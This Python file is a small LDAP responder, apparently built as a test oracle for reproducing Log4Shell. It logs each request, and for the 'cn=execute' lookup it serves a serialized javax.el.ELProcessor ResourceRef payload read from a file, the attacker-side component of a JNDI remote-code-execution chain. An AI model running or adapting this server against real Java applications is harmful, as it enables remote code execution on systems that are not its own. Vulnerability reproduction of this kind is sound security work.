"""Independent LDAP responder for benign observation and source-built ResourceRef."""
import base64
import json
import os
from pathlib import Path
import socketserver
import sys
import threading
import time

PORT = 1388
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'log4shell_http'))
from native_probe import ber


def encode(tag, data):
    size = len(data)
    length = bytes([size]) if size < 128 else bytes([128 + (size.bit_length() + 7) // 8]) + size.to_bytes((size.bit_length() + 7) // 8, 'big')
    return bytes([tag]) + length + data


def read_frame(stream):
    first = stream.read(2)
    if not first:
        return None
    assert len(first) == 2
    size = first[1]
    if size & 128:
        count = size & 127
        assert 0 < count <= 3
        extra = stream.read(count)
        assert len(extra) == count
        first += extra
        size = int.from_bytes(extra, 'big')
    assert size <= 65536
    body = stream.read(size)
    assert len(body) == size
    return first + body


def message(identifier, tag, body):
    return encode(48, encode(2, identifier) + encode(tag, body))


def attribute(name, value):
    return encode(48, encode(4, name.encode()) + encode(49, encode(4, value)))


def serve(artifacts):
    lock = threading.Lock()

    def record(**row):
        with lock:
            with (artifacts / 'native-oracle-events.jsonl').open('a') as output:
                output.write(json.dumps(row) + '\n')

    class Handler(socketserver.StreamRequestHandler):
        def handle(self):
            self.request.settimeout(8)
            try:
                while True:
                    wire = read_frame(self.rfile)
                    if wire is None:
                        return
                    tag, body, rest = ber(wire)
                    assert tag == 48 and not rest
                    tag, identifier, body = ber(body)
                    assert tag == 2
                    operation, content, controls = ber(body)
                    row = dict(kind='ldap', operation=operation, request_base64=base64.b64encode(wire).decode())
                    if operation == 66:
                        record(**row)
                        return
                    if operation == 96:
                        response = message(identifier, 97, bytes.fromhex('0a010004000400'))
                    elif operation == 99:
                        tag, base_dn, rest = ber(content)
                        assert tag == 4 and base_dn in [b'cn=observe', b'cn=execute']
                        row['base_dn'] = base_dn.decode()
                        attrs = b''
                        if base_dn == b'cn=execute':
                            payload = (artifacts / 'native-resource-ref.bin').read_bytes()
                            attrs = attribute('javaClassName', b'javax.el.ELProcessor') + attribute('javaSerializedData', payload)
                            row['payload_sha256'] = __import__('hashlib').sha256(payload).hexdigest()
                        response = message(identifier, 100, encode(4, base_dn) + encode(48, attrs))
                        response += message(identifier, 101, bytes.fromhex('0a010004000400'))
                    else:
                        raise ValueError('Unexpected native LDAP operation')
                    row['response_base64'] = base64.b64encode(response).decode()
                    record(**row)
                    self.wfile.write(response)
                    self.wfile.flush()
            except (OSError, ValueError, AssertionError) as error:
                record(kind='oracle_error', error=str(error))

    class Server(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    with Server(('0.0.0.0', PORT), Handler) as server:
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        record(kind='oracle_ready')
        (artifacts / 'native-oracle-ready.json').write_text(json.dumps(dict(pid=os.getpid(), port=PORT)) + '\n')
        deadline = time.monotonic() + 180
        while not (artifacts / 'native-oracle-stop').exists() and time.monotonic() < deadline:
            time.sleep(0.05)
        if not (artifacts / 'native-oracle-stop').exists():
            record(kind='oracle_timeout')
        server.shutdown()
        thread.join(5)
    record(kind='oracle_stopped')


if __name__ == '__main__':
    serve(Path(sys.argv[1]))
